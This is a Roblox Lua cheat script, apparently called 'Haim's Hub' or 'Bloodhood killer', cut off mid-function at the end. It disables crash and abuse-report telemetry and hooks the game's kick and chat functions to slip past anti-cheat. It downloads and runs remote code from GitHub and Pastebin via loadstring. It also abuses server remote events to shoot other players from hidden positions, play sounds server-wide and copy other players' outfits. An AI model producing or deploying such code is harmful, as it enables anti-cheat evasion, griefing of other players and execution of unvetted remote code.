print(
    [[ 
__   __  _______  ______   _______    _______  __   __    __   __  _______  ___   __   __ 
|  |_|  ||   _   ||      | |       |  |  _    ||  | |  |  |  | |  ||   _   ||   | |  |_|  |
|       ||  |_|  ||  _    ||    ___|  | |_|   ||  |_|  |  |  |_|  ||  |_|  ||   | |       |
|       ||       || | |   ||   |___   |       ||       |  |       ||       ||   | |       |
|       ||       || |_|   ||    ___|  |  _   | |_     _|  |       ||       ||   | |       |
| ||_|| ||   _   ||       ||   |___   | |_|   |  |   |    |   _   ||   _   ||   | | ||_|| |
|_|   |_||__| |__||______| |_______|  |_______|  |___|    |__| |__||__| |__||___| |_|   |_|
]]
)
game.ReplicatedFirst:RemoveDefaultLoadingScreen()

COREGUI = game:GetService("CoreGui")
if not game:IsLoaded() then
	local notLoaded = Instance.new("Message")
	notLoaded.Parent = COREGUI
	notLoaded.Text = "Haim's Hub Loading..."
	game.Loaded:Wait()
	notLoaded:Destroy()
end
local notif =
    loadstring(
    game:HttpGet("https://raw.githubusercontent.com/Jxereas/UI-Libraries/main/notification_gui_library.lua", true)
)()
local function rstring(length)
    local randomString = ""
    for i = 1, length do
        randomString = randomString .. string.char(math.random(65, 90 + math.random(0, 1) * 32))
    end
    return randomString
end

function Bypass_Everything()
   	if setfflag then
	setfflag("CrashUploadToBacktraceUrl", "")
    setfflag("CrashpadUploadToBacktraceUrl", "")
    setfflag("CrashUploadToBacktracePercentage", "0")
    setfflag("CrashUploadToBacktraceWindowsPlayerToken", "")
    setfflag("CrashUploadToBacktraceBlackholeToken", "")
    setfflag("DebugCrashEnabled", "False")
    setfflag("GoogleAnalyticsAccountPropertyID", "")
    setfflag("WindowsLaunchTypeAnalytics", "False")
    setfflag("AbuseReportScreenshot", "False")
    setfflag("AbuseReportScreenshotPercentage", "0")
    setfflag("TelegrafHTTPTransportUrl", "")
    setfflag("EnableGCapsHardwareTelemetry", "False")
    setfflag("EnableExtendedHardwareTelemetry", "False")
    setfflag("EnableInferredOOMTelemetry", "False")
    setfflag("EnableHardwareTelemetry", "False")
    setfflag("HardwareTelemetryHundredthsPercent", "0")
    setfflag('FixGraphicsQuality', 'True')
	setfflag('EnableInGameMenuChrome', 'True')
	setfflag('HandleAltEnterFullscreenManually', 'True')
	setfflag('MeshPartHeadsDefaultIsEnabled', 'True')
	setfflag('LogNetwork', '7')
    	end
local GetFullName = game.GetFullName
print("hii")
if not game:IsLoaded() then
    game.Loaded:Wait()
end
setfpscap(110)
for k,v in pairs(getgc(true)) do
   if pcall(function() return rawget(v,"indexInstance") end) and type(rawget(v,"indexInstance")) == "table" and  (rawget(v,"indexInstance"))[1] == "kick" then
       v.tvk = {"kick",function() return game.Workspace:WaitForChild("") end}
   end
end
local LP = game:GetService('Players').LocalPlayer
local PlayerScripts = LP ~= nil and LP:FindFirstChild('PlayerScripts') or nil
local ChatScript = PlayerScripts ~= nil and PlayerScripts:FindFirstChild('ChatScript') or nil
local ChatMain = ChatScript ~= nil and ChatScript:FindFirstChild('ChatMain') or nil
   local localPlayer = game:GetService("Players").LocalPlayer
                local chatMain =
                    localPlayer:WaitForChild("PlayerScripts"):WaitForChild("ChatScript"):WaitForChild("ChatMain")
                local messagePosted = require(chatMain).MessagePosted
                hookfunction(
                    messagePosted.fire,
                    function()
                        return
                    end
                )

	oldhmmnc = hookmetamethod(game, "__namecall", function(self, ...)
	if self == game.Players.LocalPlayer and getnamecallmethod():lower() == "destroy" or getnamecallmethod():lower() == "remove" then
	return end
	return oldhmmnc(self, ...)
	end)


	task.spawn(function()
		if not game.Players.LocalPlayer.Character then
			game.Players.LocalPlayer.CharacterAdded:Wait()
			task.wait(4)
			game:GetService'MaterialService'.Use2022Materials = false
			workspace.StreamingEnabled = false
		end
	end)
	
    notif.new("message", "Successed", "Anti Cheat From Any Way Bypassed.", true, 5)
end
local key = "a"

Workspace.FallenPartsDestroyHeight = 0 / 0

if key then
    local uh = {}

    function uh.hub()
     
        local Workspace = game:GetService("Workspace")
        local RepStorage = game:GetService("ReplicatedStorage")
        local RunService = game:GetService("RunService")
        local Players = game:GetService("Players")
        local StarterGui = game:GetService("StarterGui")
        local StarterPlayer = game:GetService("StarterPlayer")
        local Lighting = game:GetService("Lighting")
        local MarketPlace = game:GetService("MarketplaceService")
        local SoundService = game:GetService("SoundService")
        notif.new("warning", "Pay Attention.", "Don't abuse , or blacklist.", true, 5)
        
        local plr = Players.LocalPlayer
        local Char = Workspace[plr.Name] or plr.CharacterAdded:Wait()
        local settings = {
            AI = false,
            HaimVersion = true,
            Version = "4.0"
        }

        _G.RemoveLag = false
        _G.Cooldown = 0
        _G.Power = 14000 -- dont do too much lol
        _G.Method = "heartbeat"

        -- method 1 - for-i loop
        -- method 2 - heartbeat loop
        -- method 3 - bullets - (not working yet)

        pcall(
            function()
                Players.LocalPlayer.Backpack.Revolver.UI:Destroy()
                Players.LocalPlayer.Backpack.DB.UI:Destroy()
                Players.LocalPlayer.PlayerScripts.Stomp:Destroy()
                Players.LocalPlayer.PlayerGui.ScreenGui:Destroy()
                for i, v in pairs(Char:GetChildren()) do
                    if v.Name == "LocalScript" or v.Name == "SprintScript" then
                        v:Destroy()
                    end
                end
                for i, v in pairs( Players.LocalPlayer.PlayerGui:GetChildren()) do
                            if v.Name == "LocalScript" then
                                v:Destroy()
                            end
                        end
            end
        )
        Players.LocalPlayer.CharacterAdded:connect(
            function()
                pcall(
                    function()
                        Players.LocalPlayer.Backpack.Revolver.UI:Destroy()
                        Players.LocalPlayer.Backpack.DB.UI:Destroy()
                        Players.LocalPlayer.PlayerScripts.Stomp:Destroy()
                        Players.LocalPlayer.PlayerGui.ScreenGui:Destroy()
                        for i, v in pairs(Char:GetChildren()) do
                            if v.Name == "LocalScript" then
                                v:Destroy()
                            end
                        end
                 
                         for i, v in pairs(Players.LocalPlayer.PlayerGui:GetChildren()) do
                            if v.Name == "LocalScript" then
                                v:Destroy()
                            end
                         end
                    end
               )
            end
        )
        Workspace.FallenPartsDestroyHeight = 0 / 0
        local function has_property(instance, property)
    local clone = instance:Clone()
    clone:ClearAllChildren()

    return (pcall(
        function()
            return clone[property]
        end
    ))
end
local customfuncs = {}
function customfuncs:EnableValue(val)
    if val:IsA("BoolValue") then
        local randomplr = game.Players:GetPlayers()[math.random(1, #game.Players:GetPlayers())]
        local a = {Hooked=val,Handle={Position=Players[randomplr].Character:WaitForChild("RightFoot").Position+Players[randomplr].Character:WaitForChild("RightFoot").Velocity},SpawnPart=Players[randomplr].Character:WaitForChild("Head")}
        RepStorage.ToolRemoteEvents.Taser:FireServer(Vector3.new(99, 99, 99),a)
    end
end

    function customfuncs:PlaySounded(sound)
            if sound:IsA("Sound") then
                RepStorage.ToolRemoteEvents.SnowballLauncher:FireServer(
                    Vector3.new(9, 9, 9),
                    {Ammo = {Value = 2}, Handle = {NoAmmo = sound}}
                )
            end
        end

function customfuncs:EnableProperty(prop)
    if has_property(prop, "Enabled") then
        local gun
        local randomplr = game.Players:GetPlayers()[math.random(1, #game.Players:GetPlayers())]
        for i, v in pairs(plr.Backpack:GetChildren()) do
            if v:FindFirstChild("FireClient") then
                gun = v
                break
            end
        end
        local a = {
            Ammo = {Value = 99},
            Barrel = {ShootUI = {Shoot = gun.Barrel.ShootUI.Shoot}},
            Handle = {ShootLight = prop}
        }

        RepStorage.ToolRemoteEvents.Rev:FireServer(Vector3.new(99, 99, 99), a)
        ReplStorage:FindFirstChild("ReloadWeapon"):FireServer()
    end
end

        function customfuncs:report(plr, reason, reason2)
            Players["ReportAbuse"](Players, Players[plr], reason, reason2)
        end

        function customfuncs:stealfit(humdes)
            local toget = {
                "BackAccessory",
                "ClimbAnimation",
                "Face",
                "FaceAccessory",
                "FallAnimation",
                "FrontAccessory",
                "GraphicTShirt",
                "HairAccessory",
                "HatAccessory",
                "Head",
                "HeadScale",
                "HeightScale",
                "IdleAnimation",
                "JumpAnimation",
                "LeftArm",
                "LeftLeg",
                "MoodAnimation",
                "NeckAccessory",
                "Pants",
                "ProportionScale",
                "RightArm",
                "RightLeg",
                "RunAnimation",
                "Shirt",
                "SwimAnimation",
                "Torso",
                "WaistAccessory",
                "WalkAnimation",
                "WidthScale"
            }
            local color = {}
            local specifichumdesc = humdes
            task.spawn(
                function()
                    for i, v in pairs(toget) do
                        if
                            typeof(specifichumdesc[v]) == "string" and specifichumdesc[v] ~= "" or
                                typeof(specifichumdesc[v]) == "number" and specifichumdesc[v] > 0
                         then
                            if typeof(specifichumdesc[v]) == "string" then
                                if string.find(specifichumdesc[v], ",") then
                                    for i, _ in pairs(specifichumdesc[v]:split(",")) do
                                        local args = {
                                            [1] = "accessory",
                                            [2] = tonumber(_)
                                        }
                                        RepStorage:WaitForChild("AvatarEditor"):WaitForChild("RemoteEvent"):FireServer(
                                            unpack(args)
                                        )
                                        wait(0.4)
                                    end
                                else
                                    local args = {
                                        [1] = "accessory",
                                        [2] = tonumber(specifichumdesc[v])
                                    }
                                    RepStorage:WaitForChild("AvatarEditor"):WaitForChild("RemoteEvent"):FireServer(
                                        unpack(args)
                                    )
                                end
                            else
                                local args = {
                                    [1] = "accessory",
                                    [2] = specifichumdesc[v]
                                }
                                RepStorage:WaitForChild("AvatarEditor"):WaitForChild("RemoteEvent"):FireServer(
                                    unpack(args)
                                )
                            end
                        end
                        wait(0.5)
                    end
                end
            )
            for i, v in pairs(toget) do
                if string.find(v, "Scale") then
                    local args = {
                        [1] = "scale",
                        [2] = v,
                        [3] = specifichumdesc[v]
                    }
                    RepStorage:WaitForChild("AvatarEditor"):WaitForChild("RemoteEvent"):FireServer(unpack(args))
                end
                wait(0.9)
            end
        end

        local DiscordLib =
            loadstring(game:HttpGet "https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/discord")()

        local win = DiscordLib:Window("Bloodhood killer " .. settings["Version"])
        local serv = win:Server("The Hub.", "")
        local Loops = {}
        local Fighting = serv:Channel("Fighting People.")
        local btns = serv:Channel("Character Based")
        local ServerAffect = serv:Channel("Server Misc.")
        local tgls = serv:Channel("Toggles")
        local crash = serv:Channel("Crashers.")
        local Fun = serv:Channel("Fun.")
        local Demolisher = serv:Channel("Demolishing.")
        local Outfited = serv:Channel("Outfit.")
        local Admins = serv:Channel("Admins/Other Guis.")

        Fun:Button(
            "Goto spaceship",
            function()
                plr.Character.HumanoidRootPart.CFrame = Workspace.Spaceship.HoverSeatV2.CFrame
            end
        )

        Fun:Button(
            "control fully spaceship(do vfly with infinite yeild",
            function()
                Workspace.Spaceship.HoverSeatV2.BodyGyro:Destroy()
                Workspace.Spaceship.HoverSeatV2.BodyPosition:Destroy()
            end
        )
        Fun:Button(
            "Bald Tool(reset after each time)",
            function()
                local players, replicatedStorage, runService, userInputService =
                    Players,
                    RepStorage,
                    game:GetService("RunService"),
                    game:GetService("UserInputService")
                local client, mouse = players.LocalPlayer, players.LocalPlayer:GetMouse()
                local guimain = Instance.new("Folder", game.CoreGui)
                local CC = game:GetService "Workspace".CurrentCamera
                local LocalMouse = game.Players.LocalPlayer:GetMouse()

                function getClosestPlayerToCursor()
                    local closestPlayer
                    local shortestDistance = 222
                    local CC = game:GetService "Workspace".CurrentCamera
                    for i, v in pairs(game.Players:GetPlayers()) do
                        if
                            v ~= game.Players.LocalPlayer and v.Character and v.Character:FindFirstChild("Humanoid") and
                                v.Character.Humanoid.Health ~= 0 and
                                v.Character:FindFirstChild("LowerTorso")
                         then
                            local pos = CC:WorldToViewportPoint(v.Character.PrimaryPart.Position)
                            local magnitude =
                                (Vector2.new(pos.X, pos.Y) - Vector2.new(LocalMouse.X, LocalMouse.Y)).magnitude
                            if magnitude < shortestDistance then
                                closestPlayer = v
                                shortestDistance = magnitude
                            end
                        end
                    end
                    return closestPlayer
                end

                local mouse = game.Players:WaitForChild(game.Players.LocalPlayer.Name):GetMouse()
                function rpg(ni)
                    local args = {
                        [1] = {
                            Ammo = {Value = 8473784},
                            Launcher = ni,
                            Handle = {
                                Position = Vector3.new(9, 9, 9)
                            }
                        },
                        [2] = Vector3.new(99, 0, 0)
                    }

                    game.ReplicatedStorage:WaitForChild("ToolRemoteEvents"):WaitForChild("RPG"):FireServer(unpack(args))
                end
                a = mouse.Target
                local TpTool = Instance.new("Tool")
                TpTool.Name = "Bald tool"
                TpTool.RequiresHandle = false
                TpTool.Parent = game.Players.LocalPlayer.Backpack

                TpTool.Activated:Connect(
                    function()
                        for i, v in pairs(getClosestPlayerToCursor().Character:GetChildren()) do
                            if
                                v:IsA("Accessory") and v.Handle:FindFirstChild("HairAttachment") and
                                    v.Handle.Transparency == 0
                             then
                                rpg(v.Handle)
                            end
                        end
                    end
                )
            end
        )
        Fighting:Button(
            "Shoot from no where press T",
            function()
                local players, replicatedStorage, runService, userInputService =
                    Players,
                    RepStorage,
                    game:GetService("RunService"),
                    game:GetService("UserInputService")
                local client, mouse = players.LocalPlayer, players.LocalPlayer:GetMouse()
                local guimain = Instance.new("Folder", game.CoreGui)
                local CC = game:GetService "Workspace".CurrentCamera
                local LocalMouse = Players.LocalPlayer:GetMouse()

                getgenv().Partz = "LowerTorso"
                getgenv().AutoPrediction = true

                function getClosestPlayerToCursor()
                    local closestPlayer
                    local shortestDistance = 99999

                    for i, v in pairs(Players:GetPlayers()) do
                        if
                            v ~= Players.LocalPlayer and v.Character and v.Character:FindFirstChild("Humanoid") and
                                v.Character.Humanoid.Health ~= 0 and
                                v.Character:FindFirstChild("LowerTorso")
                         then
                            local pos = CC:WorldToViewportPoint(v.Character.PrimaryPart.Position)
                            local magnitude =
                                (Vector2.new(pos.X, pos.Y) - Vector2.new(LocalMouse.X, LocalMouse.Y)).magnitude
                            if magnitude < shortestDistance then
                                closestPlayer = v
                                shortestDistance = magnitude
                            end
                        end
                    end
                    return closestPlayer
                end

                -- variables
                local players, replicatedStorage, runService, userInputService =
                    Players,
                    RepStorage,
                    game:GetService("RunService"),
                    game:GetService("UserInputService")
                local client, mouse = players.LocalPlayer, players.LocalPlayer:GetMouse()

                local toolRemoteEvents = replicatedStorage:FindFirstChild("ToolRemoteEvents")
                local reloadWeapon = replicatedStorage:FindFirstChild("ReloadWeapon")

                local keyHeld = false

                -- events
                userInputService.InputBegan:Connect(
                    function(key)
                        if userInputService:GetFocusedTextBox() then
                            return
                        end

                        if key.KeyCode == Enum.KeyCode.T then
                            keyHeld = true
                        end
                    end
                )

                userInputService.InputEnded:Connect(
                    function(key)
                        if userInputService:GetFocusedTextBox() then
                            return
                        end

                        if key.KeyCode == Enum.KeyCode.T then
                            keyHeld = false
                        end
                    end
                )
                getgenv().Partz = "LowerTorso"
                getgenv().Prediction = 0.158
                runService.RenderStepped:Connect(
                    function()
                        if keyHeld == true then
                            if client.Character and client.Character:FindFirstChildOfClass("Tool") then
                                local tool = client.Character:FindFirstChildOfClass("Tool")

                                toolRemoteEvents[((tool.Name ~= "Revolver" and tool.Name) or "Rev")]:FireServer(
                                    getClosestPlayerToCursor().Character.HumanoidRootPart.Position,
                                    {
                                        Ammo = {Value = 99},
                                        Barrel = {
                                            ShootUI = {Shoot = tool.Barrel.ShootUI.Shoot},
                                            Position = getClosestPlayerToCursor().Character.HumanoidRootPart.Position +
                                                Vector3.new(
                                                    math.random(-25, 25),
                                                    math.random(5, 11),
                                                    math.random(-25, 25)
                                                )
                                        },
                                        Handle = tool.Handle or
                                            {ShootLight = game.Workspace:FindFirstChildOfClass("Script")}
                                    }
                                )
                                reloadWeapon:FireServer()
                            end
                        end
                    end
                )
            end
        )

        function getClosestPlayerToCursor()
            local closestPlayer
            local shortestDistance = circle.Radius

            for i, v in pairs(Players:GetPlayers()) do
                if
                    v ~= Players.LocalPlayer and v.Character and v.Character:FindFirstChild("Humanoid") and
                        v.Character.Humanoid.Health ~= 0 and
                        v.Character:FindFirstChild("LowerTorso")
                 then
                    local pos = CC:WorldToViewportPoint(v.Character.PrimaryPart.Position)
                    local magnitude = (Vector2.new(pos.X, pos.Y) - Vector2.new(LocalMouse.X, LocalMouse.Y)).magnitude
                    if magnitude < shortestDistance then
                        closestPlayer = v
                        shortestDistance = magnitude
                    end
                end
            end
            return closestPlayer
        end

        --

        Fighting:Button(
            "shoot rpg",
            function()
                local mouse = Players:WaitForChild(Players.LocalPlayer.Name):GetMouse()
                function rpg()
                    local args = {
                        [1] = {
                            Ammo = {Value = 8473784},
                            Launcher = Players.LocalPlayer.Character.HumanoidRootPart,
                            Handle = {
                                Position = Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle.Position
                            }
                        },
                        [2] = mouse.Hit.Position
                    }

                    RepStorage:WaitForChild("ToolRemoteEvents"):WaitForChild("RPG"):FireServer(unpack(args))
                end

                mouse.KeyDown:connect(
                    function(key)
                        if key == "h" then
                            rpg()
                        end
                    end
                )
            end
        )

        ServerAffect:Button(
            "stomp everyone?(sound)",
            function()
                for i, v in pairs(game.Workspace:GetDescendants()) do
                    if v:IsA("Sound") and v.Name == "Splatter" then
                        customfuncs:PlaySounded(v)
                    end
                end
            end
        )

        ServerAffect:Button(
            "Demolish sounds",
            function()
                for i, v in pairs(game:GetDescendants()) do
                    if v:IsA("Sound") then
                        customfuncs:PlaySounded(v)
                    end
                end
            end
        )

        ServerAffect:Button(
            "Demolish boombox",
            function()
                for i, v in pairs(game.Workspace:GetDescendants()) do
                    if v:IsA("Sound") and v.Parent.Name == "Handle" and v.Playing == true then
                        customfuncs:PlaySounded(v)
                    end
                end
            end
        )
        Fun:Button(
            "star glithcer",
            function()
                game:GetObjects("rbxassetid://10232949018")[1].Parent = Players.LocalPlayer.Character
                wait(1)

                Players.LocalPlayer.Character["TheWings"].handlex.Weld.Part0 = Players.LocalPlayer.Character.UpperTorso
                Players.LocalPlayer.Character["TheWings"].handle.Weld.Part0 = Players.LocalPlayer.Character.UpperTorso
                Players.LocalPlayer.Character["TheWings"].rwing5:Destroy()
                Players.LocalPlayer.Character["TheWings"].rwing4:Destroy()
                Players.LocalPlayer.Character["TheWings"].lwing6:Destroy()
                Players.LocalPlayer.Character["TheWings"].lwing4:Destroy()
                Players.LocalPlayer.Character["TheWings"].rwing6:Destroy()
                Players.LocalPlayer.Character["TheWings"].lwing5:Destroy()

                for i, v in pairs(Players.LocalPlayer.Character.TheWings:GetDescendants()) do
                    if v.ClassName:find("Part") then
                        pcall(
                            function()
                                v.CanCollide = false
                                v.CanQuery = false
                                v.CanTouch = false
                                v.Massless = true
                            end
                        )
                    end
                end

                for i, v in pairs(Players.LocalPlayer.Character.TheWings:GetDescendants()) do
                    if v.ClassName:find("Part") then
                        pcall(
                            function()
                                v.Color = Color3.new(0, 0, 0)
                            end
                        )
                    end
                    if v.ClassName:find("Trail") then
                        v.Enabled = true
                        v.Color = ColorSequence.new(Color3.fromRGB(255, 255, 255))
                    end
                end
                wait(1.5)

                function clerp(a, b, t)
                    local qa = {
                        QuaternionFromCFrame(a)
                    }
                    local qb = {
                        QuaternionFromCFrame(b)
                    }
                    local ax, ay, az = a.x, a.y, a.z
                    local bx, by, bz = b.x, b.y, b.z
                    local _t = 1 - t
                    return QuaternionToCFrame(
                        _t * ax + t * bx,
                        _t * ay + t * by,
                        _t * az + t * bz,
                        QuaternionSlerp(qa, qb, t)
                    )
                end
                function QuaternionFromCFrame(cf)
                    local mx, my, mz, m00, m01, m02, m10, m11, m12, m20, m21, m22 = cf:components()
                    local trace = m00 + m11 + m22
                    if trace > 0 then
                        local s = math.sqrt(1 + trace)
                        local recip = 0.5 / s
                        return (m21 - m12) * recip, (m02 - m20) * recip, (m10 - m01) * recip, s * 0.5
                    else
                        local i = 0
                        if m00 < m11 then
                            i = 1
                        end
                        if m22 > (i == 0 and m00 or m11) then
                            i = 2
                        end
                        if i == 0 then
                            local s = math.sqrt(m00 - m11 - m22 + 1)
                            local recip = 0.5 / s
                            return 0.5 * s, (m10 + m01) * recip, (m20 + m02) * recip, (m21 - m12) * recip
                        elseif i == 1 then
                            local s = math.sqrt(m11 - m22 - m00 + 1)
                            local recip = 0.5 / s
                            return (m01 + m10) * recip, 0.5 * s, (m21 + m12) * recip, (m02 - m20) * recip
                        elseif i == 2 then
                            local s = math.sqrt(m22 - m00 - m11 + 1)
                            local recip = 0.5 / s
                            return (m02 + m20) * recip, (m12 + m21) * recip, 0.5 * s, (m10 - m01) * recip
                        end
                    end
                end
                function QuaternionToCFrame(px, py, pz, x, y, z, w)
                    local xs, ys, zs = x + x, y + y, z + z
                    local wx, wy, wz = w * xs, w * ys, w * zs
                    local xx = x * xs
                    local xy = x * ys
                    local xz = x * zs
                    local yy = y * ys
                    local yz = y * zs
                    local zz = z * zs
                    return CFrame.new(
                        px,
                        py,
                        pz,
                        1 - (yy + zz),
                        xy - wz,
                        xz + wy,
                        xy + wz,
                        1 - (xx + zz),
                        yz - wx,
                        xz - wy,
                        yz + wx,
                        1 - (xx + yy)
                    )
                end
                function QuaternionSlerp(a, b, t)
                    local cosTheta = a[1] * b[1] + a[2] * b[2] + a[3] * b[3] + a[4] * b[4]
                    local startInterp, finishInterp
                    if cosTheta >= 1.0E-4 then
                        if 1 - cosTheta > 1.0E-4 then
                            local theta = math.acos(cosTheta)
                            local invSinTheta = 1 / math.sin(theta)
                            startInterp = math.sin((1 - t) * theta) * invSinTheta
                            finishInterp = math.sin(t * theta) * invSinTheta
                        else
                            startInterp = 1 - t
                            finishInterp = t
                        end
                    elseif 1 + cosTheta > 1.0E-4 then
                        local theta = math.acos(-cosTheta)
                        local invSinTheta = 1 / math.sin(theta)
                        startInterp = math.sin((t - 1) * theta) * invSinTheta
                        finishInterp = math.sin(t * theta) * invSinTheta
                    else
                        startInterp = t - 1
                        finishInterp = t
                    end
                    return a[1] * startInterp + b[1] * finishInterp, a[2] * startInterp + b[2] * finishInterp, a[3] *
                        startInterp +
                        b[3] * finishInterp, a[4] * startInterp + b[4] * finishInterp
                end
                local CFrameFromTopBack = function(at, top, back)
                    local right = top:Cross(back)
                    return CFrame.new(
                        at.x,
                        at.y,
                        at.z,
                        right.x,
                        top.x,
                        back.x,
                        right.y,
                        top.y,
                        back.y,
                        right.z,
                        top.z,
                        back.z
                    )
                end

                vt = Vector3.new
                cf = CFrame.new
                euler = CFrame.fromEulerAnglesXYZ
                angles = CFrame.Angles
                local sine = 0
                local lwing1weld = Players.LocalPlayer.Character["TheWings"].lwing1.Weld
                local lwing2weld = Players.LocalPlayer.Character["TheWings"].rwing3.Weld
                local lwing3weld = Players.LocalPlayer.Character["TheWings"].rwing1.Weld
                local rwing1weld = Players.LocalPlayer.Character["TheWings"].rwing2.Weld
                local rwing2weld = Players.LocalPlayer.Character["TheWings"].lwing2.Weld
                local rwing3weld = Players.LocalPlayer.Character["TheWings"].lwing3.Weld
                while true do
                    task.wait()
                    sine = sine + 1
                    lwing1weld.C1 =
                        clerp(
                        lwing1weld.C1,
                        cf(2, 0, 0) * angles(math.rad(0), math.rad(0), math.rad(0)) *
                            angles(
                                math.rad(5 + 10 * math.cos(sine / 32)),
                                math.rad(0),
                                math.rad(12.5 + 5 * math.cos(sine / 32))
                            ),
                        .3
                    )
                    lwing2weld.C1 =
                        clerp(
                        lwing2weld.C1,
                        cf(3, 1, 0) * angles(math.rad(0), math.rad(0), math.rad(0)) *
                            angles(
                                math.rad(10 + 15 * math.cos(sine / 32)),
                                math.rad(0),
                                math.rad(25 + 7.5 * math.cos(sine / 32))
                            ),
                        .3
                    )
                    lwing3weld.C1 =
                        clerp(
                        lwing3weld.C1,
                        cf(3.75, 2, 0) * angles(math.rad(0), math.rad(0), math.rad(0)) *
                            angles(
                                math.rad(15 + 20 * math.cos(sine / 32)),
                                math.rad(0),
                                math.rad(37.5 + 10 * math.cos(sine / 32))
                            ),
                        .3
                    )

                    rwing1weld.C1 =
                        clerp(
                        rwing1weld.C1,
                        cf(-2, 0, 0) * angles(math.rad(0), math.rad(0), math.rad(0)) *
                            angles(
                                math.rad(5 + 10 * math.cos(sine / 32)),
                                math.rad(0),
                                math.rad(-12.5 - 5 * math.cos(sine / 32))
                            ),
                        .3
                    )
                    rwing2weld.C1 =
                        clerp(
                        rwing2weld.C1,
                        cf(-3, 1, 0) * angles(math.rad(0), math.rad(0), math.rad(0)) *
                            angles(
                                math.rad(10 + 15 * math.cos(sine / 32)),
                                math.rad(0),
                                math.rad(-25 - 7.5 * math.cos(sine / 32))
                            ),
                        .3
                    )
                    rwing3weld.C1 =
                        clerp(
                        rwing3weld.C1,
                        cf(-3.75, 2, 0) * angles(math.rad(0), math.rad(0), math.rad(0)) *
                            angles(
                                math.rad(15 + 20 * math.cos(sine / 32)),
                                math.rad(0),
                                math.rad(-37.5 - 10 * math.cos(sine / 32))
                            ),
                        .3
                    )
                end
            end
        )
        Fighting:Button(
            "fast reset",
            function()
                local plr = Players.LocalPlayer
                local old = plr.Character.HumanoidRootPart.CFrame

                plr.Character.Humanoid.Health = 0
                plr.Character.HumanoidRootPart.CFrame = CFrame.new(1, 100, 1) -- where you teleport
                wait(6)

                plr.CharacterAdded:Wait()
                plr.Character.HumanoidRootPart.CFrame = old -- teleports you back to your old position
            end
        )

        btns:Button(
            "fast rejoin",
            function()
                local queueteleport =
                    (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
                queueteleport([[game:GetService("ReplicatedFirst"):RemoveDefaultLoadingScreen()]])
                local a =
                    game:GetService("RunService").PreSimulation:Connect(
                    function()
                        for i = 1, 800 do
                            game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId)
                        end
                        if game:GetService("CoreGui"):FindFirstChild("TeeleportGui") then
                            game:GetService("CoreGui"):FindFirstChild("TeeleportGui"):Destroy()
                        end
                        task.wait()
                    end
                )
                task.wait(0.15)
                a:Disconnect()
            end
        )

        Admins:Button(
            "unachored parts gui",
            function()
                loadstring(game:HttpGet("https://pastebin.com/raw/WkZwcGjf", true))()
            end
        )

        btns:Button(
            "safe zone",
            function()
                Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, -999999, 0)
            end
        )

        Fighting:Button(
            "shoot from down",
            function()
                local players, replicatedStorage, runService, userInputService =
                    Players,
                    RepStorage,
                    game:GetService("RunService"),
                    game:GetService("UserInputService")
                local client, mouse = players.LocalPlayer, players.LocalPlayer:GetMouse()
                local guimain = Instance.new("Folder", game.CoreGui)
                local CC = game:GetService "Workspace".CurrentCamera
                local LocalMouse = Players.LocalPlayer:GetMouse()

                getgenv().Partz = "LowerTorso"
                getgenv().AutoPrediction = true

                function getClosestPlayerToCursor()
                    local closestPlayer
                    local shortestDistance = 222

                    for i, v in pairs(Players:GetPlayers()) do
                        if
                            v ~= Players.LocalPlayer and v.Character and v.Character:FindFirstChild("Humanoid") and
                                v.Character.Humanoid.Health ~= 0 and
                                v.Character:FindFirstChild("LowerTorso")
                         then
                            local pos = CC:WorldToViewportPoint(v.Character.PrimaryPart.Position)
                            local magnitude =
                                (Vector2.new(pos.X, pos.Y) - Vector2.new(LocalMouse.X, LocalMouse.Y)).magnitude
                            if magnitude < shortestDistance then
                                closestPlayer = v
                                shortestDistance = magnitude
                            end
                        end
                    end
                    return closestPlayer
                end

                -- Hold E to shoot your guns very fast, works best with Revolver
                -- init
                if not game:IsLoaded() then
                    game.Loaded:Wait()
                end

                -- variables
                local players, replicatedStorage, runService, userInputService =
                    Players,
                    RepStorage,
                    game:GetService("RunService"),
                    game:GetService("UserInputService")
                local client, mouse = players.LocalPlayer, players.LocalPlayer:GetMouse()

                local toolRemoteEvents = replicatedStorage:FindFirstChild("ToolRemoteEvents")
                local reloadWeapon = replicatedStorage:FindFirstChild("ReloadWeapon")

                local keyHeld = false

                -- events
                userInputService.InputBegan:Connect(
                    function(key)
                        if userInputService:GetFocusedTextBox() then
                            return
                        end

                        if key.KeyCode == Enum.KeyCode.T then
                            keyHeld = true
                        end
                    end
                )

                userInputService.InputEnded:Connect(
                    function(key)
                        if userInputService:GetFocusedTextBox() then
                            return
                        end

                        if key.KeyCode == Enum.KeyCode.T then
                            keyHeld = false
                        end
                    end
                )
                getgenv().Partz = "LowerTorso"
                getgenv().Prediction = 0.158
                runService.RenderStepped:Connect(
                    function()
                        if keyHeld == true then
                            if client.Character and client.Character:FindFirstChildOfClass("Tool") then
                                local tool = client.Character:FindFirstChildOfClass("Tool")

                                toolRemoteEvents[((tool.Name ~= "Revolver" and tool.Name) or "Rev")]:FireServer(
                                    getClosestPlayerToCursor().Character.HumanoidRootPart.Position,
                                    {
                                        Ammo = {Value = 99},
                                        Barrel = {
                                            ShootUI = {Shoot = tool.Barrel.ShootUI.Shoot},
                                            Position = getClosestPlayerToCursor().Character.HumanoidRootPart.Position +
                                                Vector3.new(0, -8, 0)
                                        },
                                        Handle = tool.Handle or
                                            {ShootLight = game.Workspace:FindFirstChildOfClass("Script")}
                                    }
                                )
                                reloadWeapon:FireServer()
                            end
                        end
                    end
                )
            end
        )
        Fighting:Button(
            " shoot from up",
            function()
                local players, replicatedStorage, runService, userInputService =
                    Players,
                    RepStorage,
                    game:GetService("RunService"),
                    game:GetService("UserInputService")
                local client, mouse = players.LocalPlayer, players.LocalPlayer:GetMouse()
                local guimain = Instance.new("Folder", game.CoreGui)
                local CC = game:GetService "Workspace".CurrentCamera
                local LocalMouse = Players.LocalPlayer:GetMouse()

                getgenv().Partz = "LowerTorso"
                getgenv().AutoPrediction = true

                function getClosestPlayerToCursor()
                    local closestPlayer
                    local shortestDistance = 222

                    for i, v in pairs(Players:GetPlayers()) do
                        if
                            v ~= Players.LocalPlayer and v.Character and v.Character:FindFirstChild("Humanoid") and
                                v.Character.Humanoid.Health ~= 0 and
                                v.Character:FindFirstChild("LowerTorso")
                         then
                            local pos = CC:WorldToViewportPoint(v.Character.PrimaryPart.Position)
                            local magnitude =
